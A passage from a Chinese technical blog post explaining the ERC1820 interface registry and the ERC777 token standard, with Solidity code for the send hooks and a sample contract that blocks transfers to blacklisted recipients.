如果未缓存结果，则对合约地址进行查找。 如果结果未缓存或缓存已过期，则必须通过使用合约地址调用“updateERC165Cache”手动更新缓存。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _contract 要检查的合约地址。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceId 要检查ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return True 如果合约实现了接口返回 true, 否则false.</span><br><span class="line">    function implementsERC165Interface(address _contract, bytes4 _interfaceId) public view returns (bool) &#123;</span><br><span class="line">        if (!erc165Cached[_contract][_interfaceId]) &#123;</span><br><span class="line">            return implementsERC165InterfaceNoCache(_contract, _interfaceId);</span><br><span class="line">        &#125;</span><br><span class="line">        return interfaces[_contract][_interfaceId] &#x3D;&#x3D; _contract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 在不使用或更新缓存的情况下检查合约是否实现ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _contract 要检查的合约地址。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceId 要检查ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return True 如果合约实现了接口返回 true, 否则false.</span><br><span class="line">    function implementsERC165InterfaceNoCache(address _contract, bytes4 _interfaceId) public view returns (bool) &#123;</span><br><span class="line">        uint256 success;</span><br><span class="line">        uint256 result;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, ERC165ID);</span><br><span class="line">        if (success &#x3D;&#x3D; 0 || result &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, INVALID_ID);</span><br><span class="line">        if (success &#x3D;&#x3D; 0 || result !&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, _interfaceId);</span><br><span class="line">        if (success &#x3D;&#x3D; 1 &amp;&amp; result &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 检查_interfaceHash 是否是ERC165接口（以28个零结尾）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 要检查接口 hash。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return  如果 &#39;_interfaceHash&#39;是ERC165接口返回 True, 否则返回false</span><br><span class="line">    function isERC165Interface(bytes32 _interfaceHash) internal pure returns (bool) &#123;</span><br><span class="line">        return _interfaceHash &amp; 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @dev 调用合约接口，如果函数不存在也不抛出异常。</span><br><span class="line">    function noThrowCall(address _contract, bytes4 _interfaceId)</span><br><span class="line">        internal view returns (uint256 success, uint256 result)</span><br><span class="line">    &#123;</span><br><span class="line">        bytes4 erc165ID &#x3D; ERC165ID;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let x :&#x3D; mload(0x40)               &#x2F;&#x2F; Find empty storage location using &quot;free memory pointer&quot;</span><br><span class="line">            mstore(x, erc165ID)                &#x2F;&#x2F; Place signature at beginning of empty storage</span><br><span class="line">            mstore(add(x, 0x04), _interfaceId) &#x2F;&#x2F; Place first argument directly next to signature</span><br><span class="line"></span><br><span class="line">            success :&#x3D; staticcall(</span><br><span class="line">                30000,                         &#x2F;&#x2F; 30k gas</span><br><span class="line">                _contract,                     &#x2F;&#x2F; To addr</span><br><span class="line">                x,                             &#x2F;&#x2F; Inputs are stored at location x</span><br><span class="line">                0x24,                          &#x2F;&#x2F; Inputs are 36 (4 + 32) bytes long</span><br><span class="line">                x,                             &#x2F;&#x2F; Store output over input (saves space)</span><br><span class="line">                0x20                           &#x2F;&#x2F; Outputs are 32 bytes long</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            result :&#x3D; mload(x)                 &#x2F;&#x2F; Load the result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h3><p>ERC1820的部署方式相当巧妙，使用了无密钥部署方法（<a href="https://github.com/Arachnid/" target="_blank" rel="noopener">Nick</a>的方法），该方法依赖于一次性地址。</p><p>有兴趣的朋友可以去看<a href="https://learnblockchain.cn/docs/eips/eip-1820.html#%E8%A7%84%E8%8C%83" target="_blank" rel="noopener">EIP1820官方文档</a></p><h3 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h3><p>ERC1820合约提过了两个主要接口：</p><ul><li><code>setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer)</code><br>用来设置地址（_addr）的接口（_interfaceHash 接口名称的 keccak256 ）由哪个合约实现（_implementer）。</li><li><code>getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address)</code><br>这个函数用来查询地址（_addr）的接口由哪个合约实现。</li></ul><p>setInterfaceImplementer函数会参数信息记录到下面这个interfaces映射里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 记录 地址(第一个键) 的接口（第二个键）的实现地址（第二个值）</span><br><span class="line">mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) interfaces;</span><br></pre></td></tr></table></figure><p>相对应的 getInterfaceImplementer() 通过 interfaces 这个mapping 来获得接口的实现。</p><p>ERC777 使用 send转账时会分别在持有者和接收者地址上使用ERC1820 的getInterfaceImplementer函数进行查询，查看是否有对应的实现合约，ERC777 标准规范里预定了接口及函数名称，如果有实现则进行相应的调用。</p><h2 id="ERC777-标准规范"><a href="#ERC777-标准规范" class="headerlink" title="ERC777 标准规范"></a>ERC777 标准规范</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>ERC777 为了在实现上可以兼容ERC20，除了查询函数和ERC20一致外，操作接口均采用的独立的命名（避免相同的命令无法分辨是哪个标准），ERC777的接口定义如下，要求所有的ERC777代币合约都必须实现这些接口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777Token &#123;</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line">    function balanceOf(address holder) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 定义代币最小的划分粒度</span><br><span class="line">    function granularity() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 操作员 相关的操作（操作员是可以代表持有者发送和销毁代币的账号地址）</span><br><span class="line">    function defaultOperators() external view returns (address[] memory);</span><br><span class="line">    function isOperatorFor(</span><br><span class="line">        address operator,</span><br><span class="line">        address holder</span><br><span class="line">    ) external view returns (bool);</span><br><span class="line">    function authorizeOperator(address operator) external;</span><br><span class="line">    function revokeOperator(address operator) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 发送代币</span><br><span class="line">    function send(address to, uint256 amount, bytes calldata data) external;</span><br><span class="line">    function operatorSend(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 销毁代币</span><br><span class="line">    function burn(uint256 amount, bytes calldata data) external;</span><br><span class="line">    function operatorBurn(</span><br><span class="line">        address from,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 发送代币事件</span><br><span class="line">    event Sent(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 铸币事件</span><br><span class="line">    event Minted(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 销毁代币事件</span><br><span class="line">    event Burned(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 授权运营商事件</span><br><span class="line">    event AuthorizedOperator(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed holder</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 撤销运营商事件</span><br><span class="line">    event RevokedOperator(address indexed operator, address indexed holder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口说明与实现约定"><a href="#接口说明与实现约定" class="headerlink" title="接口说明与实现约定"></a>接口说明与实现约定</h3><p>ERC777 合约必须要通过 ERC1820 注册 <code>ERC777Token</code> 接口，这样任何人都可以查询合约是否是ERC777标准的合约，注册方法是: 调用ERC1820 注册合约的 <code>setInterfaceImplementer</code> 方法，参数 _addr 及 _implementer 均是合约的地址，_interfaceHash 是 <code>ERC777Token</code> 的 keccak256 哈希值（0xac7fbab5…177054）</p><p>如果 ERC777 要实现ERC20标准，还必须通过ERC1820 注册<code>ERC20Token</code>接口。</p><h3 id="ERC777-信息说明函数"><a href="#ERC777-信息说明函数" class="headerlink" title="ERC777 信息说明函数"></a>ERC777 信息说明函数</h3><p>name()，symbol()，totalSupply()，balanceOf(address) 和含义和在ERC20 中完全一样。</p><p>唯一不一样的是granularity()，用来定义代币最小的划分粒度（&gt;=1）， 要求必须在创建时设定，之后不可以更改，不管是在铸币、发送还是销毁操作的代币数量，必需是粒度的整数倍。</p><blockquote><p>granularity 和 ERC20 的 decimals 不一样，decimals用来定义小数位数，decimals 是ERC20 可选函数，为了兼容 ERC20 代币, decimals 函数要求必须返回18。而 granularity 表示的是基于最小位数(内部存储)的划分粒度。例如：0.5个代币存储为 <code>500,000,000,000,000,000</code> (0.5 X 10^18)，如果粒度为2，则最小转账单位是2（相对于<code>500,000,000,000,000,000</code>）。</p></blockquote><h3 id="ERC777运营商"><a href="#ERC777运营商" class="headerlink" title="ERC777运营商"></a>ERC777运营商</h3><p>ERC777 定义了一个新的运营商角色，运营商被作为移动代币的地址。 每个地址直观地移动自己的代币，将持有人和运营商的概念分开可以提供更大的灵活性。</p><p>此外，ERC777还可以定义默认操作员（默认操作员列表只能在代币创建时定义的，并且不能更改），默认操作员是被所有持有人授权的操作员，这可以为项目方管理代币带来方便，当然认何持有人仍然有权撤销默认操作员。</p><p>相关函数：</p><ul><li>defaultOperators(): 获取代币合约默认的操作员列表.</li><li>authorizeOperator(address operator): 设置一个地址作为msg.sender 的操作员，需要触发AuthorizedOperator事件。</li><li>revokeOperator(address operator): 移除 msg.sender 上 operator 操作员的权限， 需要触发RevokedOperator事件。</li><li>isOperatorFor(address operator, address holder)： 是否是某个持有者的操作员。</li></ul><p>利用运营商功能的另一个小的（并且不太明显的）好处是用户不再需要担心交易费Gas价格。现在可以将其委托给运营商。</p><h3 id="发送代币"><a href="#发送代币" class="headerlink" title="发送代币"></a>发送代币</h3><p>ERC777主要通过两个函数发送代币</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">send(address to, uint256 amount, bytes calldata data) external</span><br><span class="line"></span><br><span class="line">function operatorSend(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata data,</span><br><span class="line">    bytes calldata operatorData</span><br><span class="line">) external</span><br></pre></td></tr></table></figure><p>operatorSend 可以通过参数<code>operatorData</code>携带操作者的信息，发送代币除了执行对应账户的余额加减和触发事件之外，还有<strong>额外的规定</strong>：</p><ol><li>如果持有者有通过 ERC1820 注册 <code>ERC777TokensSender</code> 实现接口， 代币合约必须调用其 <code>tokensToSend</code> 钩子函数。</li><li>如果接收者有通过 ERC1820 注册 <code>ERC777TokensRecipient</code> 实现接口， 代币合约必须调用其 <code>tokensReceived</code> 钩子函数。</li><li>如果有 <code>tokensToSend</code> 钩子函数，必须在修改余额状态之前调用。</li><li>如果有 <code>tokensReceived</code> 钩子函数，必须在修改余额状态之后调用。</li><li>调用钩子函数及触发事件时， <code>data</code> 和 <code>operatorData</code>必须原样传递，因为 tokensToSend 和 tokensReceived 函数可能根据这个数据取消转账（触发 <code>revert</code>）。</li></ol><p>让我们来看看<code>_send</code>函数就能理解ERC777设计的巧妙之处了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function _send(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData,</span><br><span class="line">        bool requireReceptionAck</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        require(from !&#x3D; address(0), &quot;ERC777: transfer from the zero address&quot;);</span><br><span class="line">        require(to !&#x3D; address(0), &quot;ERC777: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        address operator &#x3D; _msgSender();</span><br><span class="line"></span><br><span class="line">        _callTokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">        _move(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里将交易分成了三个部分</p><h4 id="callTokensToSend"><a href="#callTokensToSend" class="headerlink" title="_callTokensToSend"></a>_callTokensToSend</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function _callTokensToSend(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData</span><br><span class="line">    ) private &#123;</span><br><span class="line">        address implementer &#x3D; _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);</span><br><span class="line">        &#x2F;&#x2F; 执行钩子函数</span><br><span class="line">        if (implementer !&#x3D; address(0)) &#123;</span><br><span class="line">            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​        此函数会检查<code>from</code>合约是否在ERC1820注册表上注册了<code>tokensToSend</code>接口，如果注册了，就会触发钩子函数。</p><p>​    <strong>ERC777TokensSender 接口</strong>定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777TokensSender &#123;</span><br><span class="line">    function tokensToSend(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata userData,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，如果持有者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensSender</code> 接口。</p><blockquote><p>有一个地方需要注意: 对于所有的 ERC777 合约， 一个持有者地址只能注册一个ERC777TokensSender接口实现。因此 ERC777TokensSender 实现会被多个ERC777合约调用，在ERC777TokensSender接口的实现合约里， msg.sender 是ERC777合约地址，而不是操作者。</p></blockquote><h4 id="move"><a href="#move" class="headerlink" title="_move"></a>_move</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function _move(</span><br><span class="line">       address operator,</span><br><span class="line">       address from,</span><br><span class="line">       address to,</span><br><span class="line">       uint256 amount,</span><br><span class="line">       bytes memory userData,</span><br><span class="line">       bytes memory operatorData</span><br><span class="line">   ) private &#123;</span><br><span class="line">       _beforeTokenTransfer(operator, from, to, amount);</span><br><span class="line"></span><br><span class="line">       uint256 fromBalance &#x3D; _balances[from];</span><br><span class="line">       require(fromBalance &gt;&#x3D; amount, &quot;ERC777: transfer amount exceeds balance&quot;);</span><br><span class="line">       unchecked &#123;</span><br><span class="line">           _balances[from] &#x3D; fromBalance - amount;</span><br><span class="line">       &#125;</span><br><span class="line">       _balances[to] +&#x3D; amount;</span><br><span class="line"></span><br><span class="line">       emit Sent(operator, from, to, amount, userData, operatorData);</span><br><span class="line">       emit Transfer(from, to, amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​        执行代币发送，实现和ERC20并无区别。在这里不过多介绍</p><h4 id="callTokensReceived"><a href="#callTokensReceived" class="headerlink" title="_callTokensReceived"></a>_callTokensReceived</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function _callTokensReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData,</span><br><span class="line">        bool requireReceptionAck</span><br><span class="line">    ) private &#123;</span><br><span class="line">        address implementer &#x3D; _ERC1820_REGISTRY.getInterfaceImplementer(to, _TOKENS_RECIPIENT_INTERFACE_HASH);</span><br><span class="line">        if (implementer !&#x3D; address(0)) &#123;</span><br><span class="line">            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125; else if (requireReceptionAck) &#123;</span><br><span class="line">            require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此函数会检查<code>to</code>合约是否在ERC1820注册表上注册<code>tokensReceived</code>接口,若注册，则触发钩子函数。</p><p><strong>ERC777TokensRecipient 接口</strong>定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777TokensRecipient &#123;</span><br><span class="line">    function tokensReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果接收者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensRecipient</code> 接口。</p><h2 id="普通账户地址监听代币转出"><a href="#普通账户地址监听代币转出" class="headerlink" title="普通账户地址监听代币转出"></a>普通账户地址监听代币转出</h2><p>在这里贴出一个Tiny熊写的监听示例，我觉得非常适合小白去理解监听机制。</p><p>监听代币的转出可以让持有者对发出去的代币有更多的控制，例如持有者可以设置一些黑名单，禁止操作员对黑名单内账号转账，</p><p>根据 ERC1820 标准，只有账号的管理者才可以为账号注册接口实现合约，<br>如果一个合约要为某个地址（或自身）实现某个接口， 则需要实现下面这个接口:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface ERC1820ImplementerInterface &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param interfaceHash 接口名称的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param addr 为哪一个地址实现接口</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 只有当合约为地址&#39;addr&#39;实现&#39;interfaceHash&#39;时返回 ERC1820_ACCEPT_MAGIC</span><br><span class="line">    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在 <code>canImplementInterfaceForAddress</code> 返回 <code>ERC1820_ACCEPT_MAGIC</code> 以声明实现了 interfaceHash 对应的接口。在调用ERC1820的 setInterfaceImplementer 函数设置接口实现时，会通过 <code>canImplementInterfaceForAddress</code> 检查合约时候实现了接口。</p><p>因此实现监听转出会和功德箱合约有些不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;IERC777Sender.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;IERC777.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;introspection&#x2F;IERC1820Registry.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;introspection&#x2F;IERC1820Implementer.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SenderControl is IERC777Sender, IERC1820Implementer &#123;</span><br><span class="line"></span><br><span class="line">  IERC1820Registry private _erc1820 &#x3D; IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);</span><br><span class="line">  bytes32 constant private ERC1820_ACCEPT_MAGIC &#x3D; keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;));</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;    keccak256(&quot;ERC777TokensSender&quot;)</span><br><span class="line">  bytes32 constant private TOKENS_SENDER_INTERFACE_HASH &#x3D;</span><br><span class="line">        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; bool) blacklist;</span><br><span class="line">  address _owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    _owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;  account call erc1820.setInterfaceImplementer</span><br><span class="line">  function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32) &#123;</span><br><span class="line">    if (interfaceHash &#x3D;&#x3D; TOKENS_SENDER_INTERFACE_HASH) &#123;</span><br><span class="line">      return ERC1820_ACCEPT_MAGIC;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return bytes32(0x00);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setBlack(address account, bool b) external &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; _owner, &quot;no premission&quot;);</span><br><span class="line">    blacklist[account] &#x3D; b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function tokensToSend(</span><br><span class="line">      address operator,</span><br><span class="line">      address from,</span><br><span class="line">      address to,</span><br><span class="line">      uint amount,</span><br><span class="line">      bytes calldata userData,</span><br><span class="line">      bytes calldata operatorData</span><br><span class="line">  ) external &#123;</span><br><span class="line">    if (blacklist[to]) &#123;</span><br><span class="line">      revert(&quot;ohh... on blacklist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约实现 canImplementInterfaceForAddress 函数，以声明对 ERC777TokensSender 接口的实现，返回 ERC1820_ACCEPT_MAGIC。</p><p>函数setBlack用来设置黑名单，它使用一个blacklist映射来管理黑名单， 在 tokensToSend函数的实现里，先检查接收者是否在黑名单内，如果在则revert 回退交易阻止转账。</p><p>给发送者账号(假设为A）设置代理合约的方法为：先部署代理合约，获得代理合约地址， 然后用A账号去调用 ERC1820 的 setInterfaceImplementer函数，参数分别是 A的地址、接口的 keccak256 即0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895 以及 代理合约地址。</p>]]></content>
      
      
      <categories>
          
          <category> EIP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EIP </tag>
